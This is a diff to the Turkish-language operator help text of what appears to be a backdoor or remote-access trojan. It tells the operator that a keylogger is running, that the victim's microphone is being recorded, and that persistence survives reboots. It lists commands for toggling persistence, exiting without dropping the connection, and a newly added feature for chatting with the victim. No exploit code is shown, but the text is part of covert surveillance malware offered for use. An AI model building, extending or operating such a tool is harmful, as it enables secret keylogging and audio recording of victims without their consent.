@@ -1,14 +1,12 @@
 	Keylogger şuan aktif.Keylogger ile ilgili komutlar için 'keylogger komutları' bölümüne bakabilirsiniz.
-	
 	Kurbanın mikrofonu kaydediliyor(Eğer iptal etmediyseniz).Mikrofon ile ilgili komutlar için 'kamera ve ses komutları' bölümüne bakabilirsiniz.
-	
 	Kalicilik kurban trojani actigindan beri aktif.(Eğer kalicilik_kaldir komutunu kullanmadiysaniz.)
-	
 	Bu backdoor kurbanın bilgisayarı her kapatıp açtığında çalışacaktır.(Eğer bu özelliği istemiyorsanız,'kalicilik_kaldir' komutunu kullaniniz.)
-	
 	Eğer 'CTRL+C' ile programdan çıkmak isterseniz; kurban, bilgisayarı tekrar başlatana kadar bağlanamazsınız. Bu yüzden çıkış yaptıktan sonra da
 	bağlanmak isterseniz  'cikis' komutu ile çıkmalısınız.
-
+	Eğer 'sohbet' komutunu kullandıysanız ve sohbetten çıkmak istiyorsanız, lütfen sohbete 'cikis' yazıp mesaj gönderin. Ardından dinleyici 
+	terminalinize gidin ve CTRL+C yapın.Böylece bağlantınız kesilmeyecek. Dinleyicinize tekrar bağlanabilirsiniz.
+	
 
 	Fonksiyonel Komutlar :
 		  |
@@ -18,7 +16,7 @@
 
 	cikis													temizle
 	▲													▲
-	╰──▶ Programdan çıkış yapar.(Bağlantıyı kesmeden)							╰──▶ Terminali temizler.
+	╰──▶ Bağlantıyı kesip programdan çıkış yapar.								╰──▶ Terminali temizler.
 
 	sistem													konus
 	▲													▲
@@ -35,9 +33,9 @@
 	▲													▲
 	╰──▶ Kaliciligi kaldirir.										╰──▶ Bu mesajı gösterir.
 
-	kalicilik
-	▲
-	╰──▶ Kaliciligi aktifleştirir.
+	kalicilik												sohbet
+	▲													▲
+	╰──▶ Kaliciligi aktifleştirir.										╰──▶ Kurban ile sohbet edin.
 	 
 	Klasör/Dosya komutları : 
 		    |
